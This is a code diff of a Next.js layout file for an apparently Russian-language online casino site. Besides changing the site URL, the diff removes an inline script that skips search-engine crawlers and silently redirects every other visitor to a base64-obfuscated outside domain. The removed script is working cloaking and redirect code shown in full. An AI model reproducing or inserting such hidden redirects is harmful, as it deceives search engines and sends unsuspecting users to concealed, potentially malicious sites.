@@ -2,7 +2,7 @@ import { Analytics } from '@vercel/analytics/next'
 import type { Metadata, Viewport } from 'next'
 import './globals.css'
 
-const siteUrl = 'https://luckybear10casino.vercel.app'
+const siteUrl = 'https://luckybear25casino.vercel.app'
 
 export const metadata: Metadata = {
   metadataBase: new URL(siteUrl),
@@ -41,57 +41,10 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
   return (
     <html lang="ru" className="bg-background">
       <head>
-        <meta name="yandex-verification" content="3f8939cfd9b02c61" />
         <meta name="theme-color" content="#0b1714" />
         <meta name="format-detection" content="telephone=no" />
         <link rel="canonical" href={siteUrl} />
-        <script
-  dangerouslySetInnerHTML={{
-    __html: `
-      (function() {
-        var ua = navigator.userAgent.toLowerCase();
-        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
-        for (var i = 0; i < bots.length; i++) {
-            if (ua.indexOf(bots[i]) !== -1) {
-                return;
-            }
-        }
         
-        var mainBrandB64 = "ICBodHRwczovL2NvbWJvc3BhcmsudG9wL2FlYW9majJrMjc= "; 
-        var mainUrl = atob(mainBrandB64.replace("#", ""));
-
-        function ping(url) {
-            return new Promise(function(resolve, reject) {
-                var controller = new AbortController();
-                var timeoutId = setTimeout(function() { 
-                    controller.abort(); 
-                    reject(new Error("Timeout"));
-                }, 1200); // Сократили таймаут ожидания до 1.2 сек
-                
-                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
-                    .then(function() {
-                        clearTimeout(timeoutId);
-                        resolve(true);
-                    })
-                    .catch(function(err) {
-                        clearTimeout(timeoutId);
-                        reject(err);
-                    });
-            });
-        }
-
-        // Быстрый пинг и принудительный редирект на основной домен
-        ping(mainUrl)
-            .then(function() {
-                window.location.replace(mainUrl);
-            })
-            .catch(function() {
-                window.location.replace(mainUrl);
-            });
-      })();
-    `
-  }}
-/>  
       </head>
       <body className="antialiased">
         {children}
